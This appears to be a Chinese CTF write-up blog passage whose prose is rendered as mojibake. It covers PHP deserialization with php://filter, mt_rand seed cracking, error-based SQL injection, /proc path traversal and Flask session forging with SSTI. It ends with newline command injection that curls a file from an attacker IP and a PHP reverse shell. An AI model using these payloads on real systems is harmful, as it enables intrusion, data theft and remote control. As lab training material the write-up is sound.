<p>æˆ‘è‡ªå·±å®¡è®¡çš„æ—¶å€™æ„Ÿè§‰æœ‰ç‚¹æ‡µï¼Œé¦–å…ˆæˆ‘ä»¬å¯èƒ½è¦ç”¨åˆ°çš„æ˜¯includeè¿™ä¹ˆä¸€ä¸ªå‡½æ•°ï¼Œè€Œvarå‡½æ•°ä¼šåœ¨__invokeçš„æ—¶å€™å»è°ƒç”¨$varï¼Œè¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Œäºæ˜¯æˆ‘ä»¬æ„é€ å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$var=<span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>æ¥ç€å°±æ˜¯å»æ‰¾å“ªé‡Œå¯ä»¥è°ƒç”¨åˆ°è¿™ä¹ˆä¸€ä¸ª__invokeæ–¹æ³•äº†ï¼Œæ ¹æ®PHPçš„æ‰‹å†Œï¼Œæˆ‘ä»¬ä¼šåœ¨ å‡½æ•°è¢«å½“æˆæ–¹æ³•è°ƒç”¨çš„æ—¶å€™è‡ªåŠ¨è°ƒç”¨ï¼Œä¾‹å­å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$mod = <span class="keyword">new</span> Modifier();</span><br><span class="line">$mod();</span><br><span class="line"><span class="comment">//åœ¨ä¸‹é¢åˆ™ä¼šè‡ªåŠ¨è°ƒç”¨invokeæ–¹æ³•</span></span><br></pre></td></tr></table></figure>



<p>å¾€ä¸‹çœ‹å°±èƒ½çœ‹è§Testæ–¹æ³•ï¼Œå› ä¸ºå®ƒè¿”å›äº†ä¸€ä¸ªfunctionã€‚æ‰€ä»¥è®©Testå»get ä¸€ä¸‹Modifierç±»ï¼Œå°±ä¼šå…ˆè°ƒç”¨__getæ–¹æ³•ï¼Œç»“æœå› ä¸ºè¢«å½“æˆäº†å‡½æ•°è¿›è¡Œè°ƒç”¨ï¼Œæˆ‘ä»¬çš„Modifierç±»è‡ªåŠ¨çš„è°ƒç”¨äº†invokeæ–¹æ³•ã€‚</p>
<p>ç„¶åæˆ‘å¡åœ¨è¿™é‡Œå¥½ä¹…..æœ€åçœ‹äº†å¸ˆå‚…ä»¬çš„åšå®¢æ‰æƒ³åˆ°è¯¥æ€ä¹ˆå†™..è¯´å®è¯è¿˜æ˜¯æœ‰ç‚¹æ‡µé€¼</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨showå‡½æ•°å½“ä¸­ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°__wakeupå‡½æ•°ï¼Œå› ä¸ºå®ƒè¿›è¡Œäº†echoæ“ä½œï¼Œæ­¤æ—¶ä¾¿ä¼šè§¦å‘stringå‡½æ•°</p>
<p>ä¿®æ”¹sourceçš„å€¼ã€‚</p>
<p>æœ€åè¦æ³¨æ„protectedå±æ€§ä¿®é¥°çš„å˜é‡åº”è¯¥ç”¨urlencodeè¿›è¡Œä¿®é¥°é¿å…ä¸å¯è§å­—ç¬¦</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var=<span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line"><span class="comment">//    private $c;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span>&#123;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = <span class="keyword">new</span> Test();</span><br><span class="line">$mod = <span class="keyword">new</span> Modifier();</span><br><span class="line">$show1 = <span class="keyword">new</span> Show();</span><br><span class="line">$show1 -&gt;str =$test;</span><br><span class="line">$show1-&gt;str-&gt;p = $mod;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$show2 = <span class="keyword">new</span> Show($show1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($show2));</span><br><span class="line"><span class="comment">//å½“æˆ‘ä»¬è§¦å‘</span></span><br></pre></td></tr></table></figure>



<p>è¿™é‡Œå°±æ˜¯è¿›è¡Œäº†ä¸€ä¸ªå¥—å¨ƒï¼Œå½“ååºåˆ—åŒ–çš„æ—¶å€™å‘¢ï¼Œshowæ–¹æ³•è¢«ååºåˆ—åŒ–ï¼Œè°ƒç”¨äº†wakeupçš„å‡½æ•°ï¼Œä¹‹ååˆå› ä¸º</p>
<p>__construct,è¿›è¡Œäº†ä¸€å¥è¾“å‡ºï¼Œæ‰€ä»¥å°±é€ æˆäº†toStringè°ƒç”¨ï¼Œåœ¨æ­¤ä¹‹å‰æˆ‘ä»¬æ„é€ å¥½è¯­å¥å³å¯</p>
<p>$show2 çº¯ç²¹çš„æ˜¯è¿›è¡Œä¸€æ¬¡wakeupè°ƒç”¨ï¼</p>
<p><img src="image-20201029191526057.png" alt="image-20201029191526057"></p>
<h1 id="6-Ezadult"><a href="#6-Ezadult" class="headerlink" title="6.Ezadult"></a>6.Ezadult</h1><p>é¡µé¢å•¥ä¹Ÿçœ‹ä¸å‡ºæ¥ï¼Œç›´æ¥<a href="http://www.zipä¸‹äº†ä¸€æ³¢ä»£ç ï¼Œä¹‹åå‘ç°æ˜¯ä¼ªéšæœºæ•°çˆ†ç ´ï¼Œæ„é€ ä¸¤ä¸ªè„šæœ¬ï¼š">www.zipä¸‹äº†ä¸€æ³¢ä»£ç ï¼Œä¹‹åå‘ç°æ˜¯ä¼ªéšæœºæ•°çˆ†ç ´ï¼Œæ„é€ ä¸¤ä¸ªè„šæœ¬ï¼š</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span></span><br><span class="line">str2 = <span class="string">&#x27;KVQP0LdJKRaV3n9D&#x27;</span></span><br><span class="line">str3 = str1[::<span class="number">-1</span>]</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res += <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(str1) - <span class="number">1</span>) + <span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(res)</span><br><span class="line"><span class="comment">#ç»“æœ 36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61 </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä¸‹è½½php_mt_randé‚£ä¸ªè„šæœ¬ï¼Œä½¿ç”¨æ•™ç¨‹ï¼š</p>
<p>è®°å¾—ç”¨makeç¼–è¯‘cè¯­è¨€çš„ä¸œè¥¿ï¼Œä¹‹å./è¿è¡Œå³å¯ï¼š</p>
<p><img src="image-20201029203700811.png" alt="image-20201029203700811"></p>
<p>è·‘å‡ºå…¬é’¥æ¥ï¼š1775196155</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">1775196155</span>);</span><br><span class="line"><span class="comment">//å…¬é’¥</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params">$length = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $public_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ç§é’¥</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params">$length = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    $strings2 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $private_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> public_key();</span><br><span class="line"><span class="keyword">echo</span> private_key();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¹‹åå¯†ç ç”¨ä¸‡èƒ½å¯†ç ä¸€è¿‡ï¼Œå³å¯å¾—åˆ°flag</p>
<p>åé¢çš„ä¸¤ä¸ªä¸€ä¸ªå¤ªéš¾ä¸€ä¸ªæ˜¯é¢˜ç›®downæ‰äº†å®Œå…¨ç”¨ä¸äº†ã€‚ã€‚</p>
]]></content>
  </entry>
  <entry>
    <title>N1BOOK</title>
    <url>/2020/12/03/N1BOOK/</url>
    <content><![CDATA[<h1 id="1-4æ²¡å•¥å¥½è¯´çš„"><a href="#1-4æ²¡å•¥å¥½è¯´çš„" class="headerlink" title="1-4æ²¡å•¥å¥½è¯´çš„"></a>1-4æ²¡å•¥å¥½è¯´çš„</h1><h1 id="arf-2"><a href="#arf-2" class="headerlink" title="arf_2"></a>arf_2</h1><p>åˆ©ç”¨nginxçš„è§£æé”™è¯¯</p>
<h1 id="SQLæ³¨å…¥2"><a href="#SQLæ³¨å…¥2" class="headerlink" title="SQLæ³¨å…¥2"></a>SQLæ³¨å…¥2</h1><p>ä¸€ä¸ªæŠ¥é”™æ³¨å…¥</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin&#x27; and  extractvalue(0x0a,concat(0x0a,(<span class="keyword">sELect</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()  ))) <span class="comment"># </span></span><br></pre></td></tr></table></figure>



<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin&#x27; and  extractvalue(0x0a,concat(0x0a,(<span class="keyword">sELect</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;fl4g&#x27;</span>  ))) <span class="comment"># </span></span><br></pre></td></tr></table></figure>



<h1 id="afr-3"><a href="#afr-3" class="headerlink" title="afr_3"></a>afr_3</h1><p>ä¸ä¼šäº†ï¼Œå­¦ä¹ äº†ã€‚</p>
<p>å½“æˆ‘ä»¬è¯»å–æ–‡ä»¶çš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡è¯»å–proc/self/cmdlineç›®å½•æ¥æŸ¥çœ‹ç³»ç»Ÿæ‰§è¡Œäº†ä»€ä¹ˆå‘½ä»¤</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">/proc/cmdline </span><br><span class="line">åœ¨å¯åŠ¨æ—¶ä¼ é€’è‡³å†…æ ¸çš„ç›¸å…³å‚æ•°ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯é€šå¸¸ç”±liloæˆ–grubç­‰å¯åŠ¨ç®¡ç†å·¥å…·è¿›è¡Œä¼ é€’ï¼› </span><br><span class="line"></span><br><span class="line">[root@rhel5 ~]# more /proc/cmdline </span><br><span class="line">ro root=/dev/VolGroup00/LogVol00 rhgb quiet </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="image-20201203143634984.png" alt="image-20201203143634984"></p>
<p>åœ¨è¿™é‡Œå°±èƒ½çœ‹è§server.pyäº†ï¼Œäºæ˜¯å†å»proc/self/cwdç›®å½•ä¸‹è¯»å–è¿™ä¸ªæ–‡ä»¶</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">cwd â€” æŒ‡å‘å½“å‰è¿›ç¨‹è¿è¡Œç›®å½•çš„ä¸€ä¸ªç¬¦å·é“¾æ¥ï¼› </span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå°±æ˜¯è¯´cwdä¸‹å¯ä»¥è¿æ¥åˆ°æ‰€æœ‰å½“å‰æ­£åœ¨å¯åŠ¨çš„è¿›ç¨‹çš„å·¥ä½œç›®å½•</p>
<p>äºæ˜¯æ„é€ ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;3a7463f9-513b-4f61-a0d1-b5ce36abfa59.node3.buuoj.cn&#x2F;article?name&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;server.py</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°æºç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> ( Flask, render_template, request, url_for, redirect, session, render_template_string )</span><br><span class="line"><span class="keyword">from</span> flask_session <span class="keyword">import</span> Session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">execfile(<span class="string">&#x27;flag.py&#x27;</span>)</span><br><span class="line">execfile(<span class="string">&#x27;key.py&#x27;</span>)</span><br><span class="line"></span><br><span class="line">FLAG = flag</span><br><span class="line">app.secret_key = key</span><br><span class="line"><span class="meta">@app.route(&quot;/n1page&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">n1page</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method != <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;index&quot;</span>))</span><br><span class="line">    n1code = request.form.get(<span class="string">&quot;n1code&quot;</span>) <span class="keyword">or</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> n1code <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        n1code = n1code.replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;_&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;n1code&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> session <span class="keyword">or</span> session[<span class="string">&#x27;n1code&#x27;</span>] <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        session[<span class="string">&#x27;n1code&#x27;</span>] = n1code</span><br><span class="line">    template = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;n1code&#x27;</span>] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        template = <span class="string">&#x27;&#x27;&#x27;&lt;h1&gt;N1 Page&lt;/h1&gt; &lt;div class=&quot;row&gt; &lt;div class=&quot;col-md-6 col-md-offset-3 center&quot;&gt; Hello : %s, why you don&#x27;t look at our &lt;a href=&#x27;/article?name=article&#x27;&gt;article&lt;/a&gt;? &lt;/div&gt; &lt;/div&gt; &#x27;&#x27;&#x27;</span> % session[<span class="string">&#x27;n1code&#x27;</span>]</span><br><span class="line">        session[<span class="string">&#x27;n1code&#x27;</span>] = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;main.html&quot;</span>)</span><br><span class="line"><span class="meta">@app.route(&#x27;/article&#x27;, methods=[&#x27;GET&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">article</span>():</span></span><br><span class="line">    error = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">        page = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        page = <span class="string">&#x27;article&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> page.find(<span class="string">&#x27;flag&#x27;</span>)&gt;=<span class="number">0</span>:</span><br><span class="line">        page = <span class="string">&#x27;notallowed.txt&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        template = <span class="built_in">open</span>(<span class="string">&#x27;/home/nu11111111l/articles/&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(page)).read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        template = e</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;article.html&#x27;</span>, template=template)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>çœ‹è§flagè¢«è¿‡æ»¤äº†ï¼Œè¯»ä¸€ä¸‹key.py</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Drmhze6EPcv0fN_81Bj-nA</span><br></pre></td></tr></table></figure>

<p>çŒ›æµ‹äº†ä¸€æ³¢</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.eJyrVsozTM5PSVWyUqquVoiO1YuPT85JLC6Ojweycovy4-OjdQ1BosWlSWCJVKCUhma0qSVIMDMvswSsMj0nPykxB6IrqTQzpyQzD8hRUKitVaoFALt_IyQ.X8irqA.tYkx2Q2zmFaN_M5JnsennKV32nI</span><br><span class="line">root@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode  -t &#x27;&#123;&quot;n1code&quot;: &quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40] &#125;&#125;&quot;&#125; &#x27; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;</span><br><span class="line">eyJuMWNvZGUiOiJ7ey5fX2NsYXNzX18uX19tcm9fX1syXS5fX3N1YmNsYXNzZXNfXygpWzQwXSB9fSJ9.X8isNQ.mwsFCJ2g4ZXyuONHb9SWzKEHrVk</span><br><span class="line">root@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode  -t &#x27;&#123;&quot;n1code&quot;: &quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__() &#125;&#125;&quot;&#125; &#x27; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;</span><br><span class="line">eyJuMWNvZGUiOiJ7ey5fX2NsYXNzX18uX19tcm9fX1syXS5fX3N1YmNsYXNzZXNfXygpIH19In0.X8isRA._rfFegMxGGcZG8hbm0Et10WBnFI</span><br><span class="line">root@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode  -t &#x27;&#123;&quot;n1code&quot;: &quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[-1].__subclasses__() &#125;&#125;&quot;&#125; &#x27; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;</span><br><span class="line">eyJuMWNvZGUiOiJ7ey5fX2NsYXNzX18uX19tcm9fX1stMV0uX19zdWJjbGFzc2VzX18oKSB9fSJ9.X8isYg.HxdhLvdW6lQkPiK3HHLXq7safdU</span><br><span class="line">root@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode  -t &#x27;&#123;&quot;n1code&quot;: &quot;&#123;&#123;\&#x27;\&#x27;.__class__.__mro__[2].__subclasses__() &#125;&#125;&quot;&#125; &#x27; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;</span><br><span class="line">bash: æœªé¢„æœŸçš„ç¬¦å·â€œ(â€é™„è¿‘æœ‰è¯­æ³•é”™è¯¯</span><br><span class="line">root@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode  -t &quot;&#123;\&quot;n1code\&quot;: \&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__() &#125;&#125;\&quot;&#125;&quot; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;</span><br><span class="line">eyJuMWNvZGUiOiJ7eycnLl9fY2xhc3NfXy5fX21yb19fWzJdLl9fc3ViY2xhc3Nlc19fKCkgfX0ifQ.X8isow.oTg9cFIhfKJan3dvrWECrR8Y4xs</span><br><span class="line">root@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode  -t &quot;&#123;\&quot;n1code\&quot;: \&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40] &#125;&#125;\&quot;&#125;&quot; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;</span><br><span class="line">eyJuMWNvZGUiOiJ7eycnLl9fY2xhc3NfXy5fX21yb19fWzJdLl9fc3ViY2xhc3Nlc19fKClbNDBdIH19In0.X8iswQ.4rU8qOrp7diJa_N5IjdCwm0EvLQ</span><br><span class="line">root@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode  -t &quot;&#123;\&quot;n1code\&quot;: \&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;flag.py&#x27;) &#125;&#125;\&quot;&#125;&quot; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;</span><br><span class="line">eyJuMWNvZGUiOiJ7eycnLl9fY2xhc3NfXy5fX21yb19fWzJdLl9fc3ViY2xhc3Nlc19fKClbNDBdKCdmbGFnLnB5JykgfX0ifQ.X8is5w.TImXqmpXkV0tjZzmcVFAIvvFP28</span><br><span class="line">root@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode  -t &quot;&#123;\&quot;n1code\&quot;: \&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;flag.py&#x27;).read() &#125;&#125;\&quot;&#125;&quot; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;</span><br><span class="line">eyJuMWNvZGUiOiJ7eycnLl9fY2xhc3NfXy5fX21yb19fWzJdLl9fc3ViY2xhc3Nlc19fKClbNDBdKCdmbGFnLnB5JykucmVhZCgpIH19In0.X8is9Q._7aNNdKqdaXGJ6mbSLLA1W9wjBQ</span><br><span class="line">root@kali:/flask-session-cookie-manager# </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æœ€åæ‰æˆåŠŸï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode  -t &quot;&#123;\&quot;n1code\&quot;: \&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;flag.py&#x27;).read() &#125;&#125;\&quot;&#125;&quot; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;</span><br></pre></td></tr></table></figure>

<h1 id="ç¬¬äºŒç« -webè¿›é˜¶-æ­»äº¡pingå‘½ä»¤"><a href="#ç¬¬äºŒç« -webè¿›é˜¶-æ­»äº¡pingå‘½ä»¤" class="headerlink" title="[ç¬¬äºŒç«  webè¿›é˜¶]æ­»äº¡pingå‘½ä»¤"></a>[ç¬¬äºŒç«  webè¿›é˜¶]æ­»äº¡pingå‘½ä»¤</h1><p>è¿™ä¸ªé¢˜ç›®çš„pingèƒ½å¤Ÿå‡ºå¤–ç½‘ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ç”¨%0aå°†pingæ¢è¡Œç»•è¿‡</p>
<p>ä¹‹åcurl [ip]/xxx.php &gt;&gt;/tmp/xx</p>
<p>phpå¯ä»¥å†™ä¸€ä¸ªåå¼¹shellæ–‡ä»¶ï¼Œè¿™é‡Œæ¯”å¦‚æˆ‘ä»¬ç”¨Pç‰›çš„ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sock = fsockopen(<span class="string">&quot;<span class="subst">$IP</span>&quot;</span>, $port);</span><br><span class="line">$descriptorspec = <span class="keyword">array</span>(</span><br><span class="line">        <span class="number">0</span> =&gt; $sock,</span><br><span class="line">        <span class="number">1</span> =&gt; $sock,</span><br><span class="line">        <span class="number">2</span> =&gt; $sock</span><br><span class="line">);</span><br><span class="line">$process = proc_open(<span class="string">&#x27;/bin/sh&#x27;</span>, $descriptorspec, $pipes);</span><br><span class="line">proc_close($process);    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¹‹åæˆ‘ä»¬å†æ‰§è¡Œå‘½ä»¤</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">%0aphp /tmp/xx </span><br></pre></td></tr></table></figure>

<p>å³å¯åå¼¹shell</p>
